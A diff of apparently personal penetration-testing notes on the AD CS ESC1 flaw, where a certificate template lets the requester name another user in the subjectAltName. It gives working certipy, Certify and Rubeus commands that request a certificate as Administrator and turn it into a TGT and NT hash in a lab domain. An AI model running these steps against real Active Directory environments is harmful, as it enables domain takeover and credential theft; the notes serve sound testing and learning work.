@@ -1,8 +1,8 @@
----
-description: ESC | Active Directory Certificate Services
----
-
 # ESC1
+
+> ***Active Directory Certificate Services***
+
+------
 
 Vulernability lies in the possibility to specify an alternate user in the certificate request. If the certificate templates allows including a `subjectAltName` (`SAN`) from another use than from the user making the ceritificate request, we can use any user.
 
@@ -15,7 +15,7 @@ certipy-ad find -u 'zen@lab.local' -p 'Password123!' -dc-ip 10.129.228.236 -vuln
       ESC1                              : 'LAB.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication 
 ```
 
-### <mark style="color:yellow;">ESC1 from Linux</mark>
+### ESC1 from Linux
 
 To abuse the ESC1 template we can use certipy to request a Certificate and include a alternate subject. This is done with `req` and `-upn Administrator` (or any other user.&#x20;
 
@@ -23,15 +23,17 @@ To abuse the ESC1 template we can use certipy to request a Certificate and inclu
 certipy req -u 'zen@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
 ```
 
-#### Authenticate with certificate and get a TGT
+**Authenticate with certificate and get a TGT**
 
-```
+```bash
 certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
 ```
 
-### <mark style="color:yellow;">ESC1 Abuse from Windows</mark>
 
-#### Enumeration with Certify.exe
+
+## ESC1 Abuse from Windows
+
+**Enumeration with Certify.exe**
 
 ```powershell
 # Certify
@@ -41,7 +43,7 @@ certipy auth -pfx administrator.pfx -username administrator -domain lab.local -d
 Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
 ```
 
-#### Convert certificate and get NT hash
+**Convert certificate and get NT hash**
 
 ```powershell
 # Request wilt alternate SAN
@@ -54,11 +56,11 @@ Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollm
 .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
 ```
 
-## Concluding
+### Concluding
 
 ESC 1 misconfiguratin is specifying an alternate user in the certificate request by alloowing to including a `subjectAltName` (`SAN)` .&#x20;
 
-#### What makes it vulnerable to ESC1?
+**What makes it vulnerable to ESC1?**
 
 | Object                        | Value                        |
 | ----------------------------- | ---------------------------- |
@@ -66,8 +68,7 @@ ESC 1 misconfiguratin is specifying an alternate user in the certificate request
 | Requires Manager approval     | False                        |
 | Authorized Signature Required | 0                            |
 
-{% hint style="info" %}
-An other group than domain users may have enrollment rights which we could me member of.
-{% endhint %}
+> An other group than domain users may have enrollment rights which we could me member of.
+>
 
 Request certificate with different UPN, then authenticate with the .pfx file giving a NT hash and a TGT.
